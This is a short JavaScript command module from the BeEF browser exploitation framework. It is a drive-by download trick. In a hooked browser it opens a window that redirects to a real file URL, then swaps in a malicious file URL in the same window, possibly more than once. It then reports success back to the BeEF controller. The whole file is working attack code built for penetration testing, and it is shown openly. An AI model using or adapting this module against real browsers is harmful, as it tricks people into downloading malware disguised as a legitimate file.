//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {	
	var maliciousurl = '<%= @malicious_file_uri %>';
	var realurl = '<%= @real_file_uri %>';	
	var w;
	var once = '<%= @do_once %>';

	function doit() {

		if (!beef.browser.isIE()) {
			w = window.open('data:text/html,<meta http-equiv="refresh" content="0;URL=' + realurl + '">', 'foo');
			setTimeout(donext, 4500);
		}

	}
	function donext() {
		window.open(maliciousurl, 'foo');
		if (once != true) setTimeout(donext, 5000);
		once = true;
	}
	doit();
	beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=Command executed");
});
